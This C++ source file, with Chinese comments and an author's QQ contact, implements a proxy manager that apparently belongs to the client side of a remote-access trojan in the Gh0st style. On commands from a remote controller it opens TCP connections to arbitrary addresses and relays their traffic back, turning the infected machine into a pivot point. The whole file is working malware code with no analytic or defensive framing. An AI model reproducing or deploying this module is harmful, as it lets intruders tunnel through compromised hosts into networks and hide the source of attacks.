// ProxyManager.cpp: implementation of the CProxyManager class.
//作者：baijianli qq:80202621
//////////////////////////////////////////////////////////////////////

#include "ProxyManager.h"
#include <MSTcpIP.h>
#include <TCHAR.h>
#include "ClientSocket.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////
#include "stdio.h"
CProxyManager::CProxyManager(CClientSocket *pClient):CManager(pClient)
{
	InitializeCriticalSection(&Sec);
	memset(m_Socket,0,sizeof(m_Socket));
	m_nSend=0;
	BYTE bToken=TOKEN_PROXY_START;
	Send(&bToken,sizeof(bToken));
}

CProxyManager::~CProxyManager()
{
	for(int i=0;i<10000;i++)
		if(m_Socket[i] && m_Socket[i]!=INVALID_SOCKET) 
		{
			closesocket(m_Socket[i]);
			m_Socket[i]=0;
		}
	DeleteCriticalSection(&Sec);
}

int CProxyManager::Send(LPBYTE lpData, UINT nSize)
{
	int ret;
	EnterCriticalSection(&Sec);
	ret=CManager::Send(lpData,nSize);
	LeaveCriticalSection(&Sec);
	return ret;
}

void CProxyManager::SendConnectResult(LPBYTE lpBuffer,DWORD ip,USHORT port)
{
	lpBuffer[0]=TOKEN_PROXY_CONNECT_RESULT;
	*(DWORD*)&lpBuffer[5]=ip;
	*(USHORT*)&lpBuffer[9]=port;
	Send(lpBuffer,11);
}

void CProxyManager::Disconnect(DWORD index)
{
	BYTE buf[5];
	buf[0]=TOKEN_PROXY_CLOSE;
	memcpy(&buf[1],&index,sizeof(DWORD));
	Send(buf,sizeof(buf));

	closesocket(m_Socket[index]);
}

void CProxyManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	switch (lpBuffer[0])
	{
		/*[1]----[4]----[4]----[2]
		cmd		 id		ip		port*/
	case COMMAND_PROXY_CONNECT:	
		{
			SocksThreadArg arg;
			arg.pThis =this;
			arg.lpBuffer =lpBuffer;
			CloseHandle(MyCreateThread(NULL,0,(unsigned long (__stdcall *)(void *))SocksThread,(LPVOID)&arg,0,NULL));
			while(arg.lpBuffer)
			Sleep(2);
		}
		break;
	case COMMAND_PROXY_CLOSE:
		closesocket(m_Socket[*(DWORD*)&lpBuffer[1]]);
		break;
	case COMMAND_PROXY_DATA:
		{
			DWORD index=*(DWORD*)&lpBuffer[1];
			DWORD nRet,nSend=5,nTry=0;
			while(m_Socket[index] && (nSend<nSize) && nTry<15)
			{			
				nRet=send(m_Socket[index],(char *)&lpBuffer[nSend],nSize-nSend,0);
				if (nRet==SOCKET_ERROR)
				{
					nRet=GetLastError();
					Disconnect(index);
					break;
				}else
				{
					nSend+=nRet;
				}
				nTry++;
			}
		}
		break;
	}
}

static DWORD WINAPI SocksThread(LPVOID lparam)
{
	SocksThreadArg * pArg=(SocksThreadArg *)lparam;
	CProxyManager * pThis=pArg->pThis;
	BYTE lpBuffer[11];
	SOCKET *psock;
	DWORD ip;
	sockaddr_in  sockAddr;
	int nSockAddrLen;
	memcpy(lpBuffer,pArg->lpBuffer,11);
	pArg->lpBuffer=0;

	DWORD index=*(DWORD*)&lpBuffer[1];
	psock=&pThis->m_Socket[index];


	*psock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); 
	if (*psock == SOCKET_ERROR)
	{  
		pThis->SendConnectResult(lpBuffer,GetLastError(),0);
		return 0;   
	}
	ip=*(DWORD*)&lpBuffer[5];
	// 构造sockaddr_in结构
	sockaddr_in	ClientAddr;
	ClientAddr.sin_family	= AF_INET;
	ClientAddr.sin_port	= *(u_short*)&lpBuffer[9];
	ClientAddr.sin_addr.S_un.S_addr = ip; 
	
	if (connect(*psock, (SOCKADDR *)&ClientAddr, sizeof(ClientAddr)) == SOCKET_ERROR)   
	{
		pThis->SendConnectResult(lpBuffer,GetLastError(),0);
		return 0;
	}
	
	memset(&sockAddr, 0, sizeof(sockAddr));
	nSockAddrLen = sizeof(sockAddr);
	getsockname(*psock, (SOCKADDR*)&sockAddr, &nSockAddrLen);
	if(sockAddr.sin_port==0) sockAddr.sin_port=1;
	pThis->SendConnectResult(lpBuffer,sockAddr.sin_addr.S_un.S_addr,sockAddr.sin_port);

	CClientSocket *pClient =pThis->m_pClient;
	BYTE buff[MAX_RECV_BUFFER];
	struct timeval timeout;
	SOCKET socket=*psock;
	fd_set fdSocket;
	FD_ZERO(&fdSocket);
	FD_SET(socket, &fdSocket);
	timeout.tv_sec=0;                //等下select用到这个
	timeout.tv_usec=10000;
	buff[0]=TOKEN_PROXY_DATA;
	memcpy(buff+1,&index,4);
	while (WaitForSingleObject(pClient->m_hEvent,10)!=WAIT_OBJECT_0)
	{
		fd_set fdRead = fdSocket;
		int nRet = select(NULL, &fdRead, NULL, NULL, &timeout);
		if (nRet == SOCKET_ERROR)
		{
			nRet=GetLastError();
			pThis->Disconnect(index);
			break;
		}
		if (nRet > 0)
		{
			int nSize = recv(socket, (char *)(buff+5), sizeof(buff)-5, 0);
			if (nSize <= 0)
			{
				pThis->Disconnect(index);
				break;
			}
			if (nSize > 0)
				pThis->Send(buff, nSize+5);
		}
	}
	FD_CLR(socket, &fdSocket);

	return 0;
}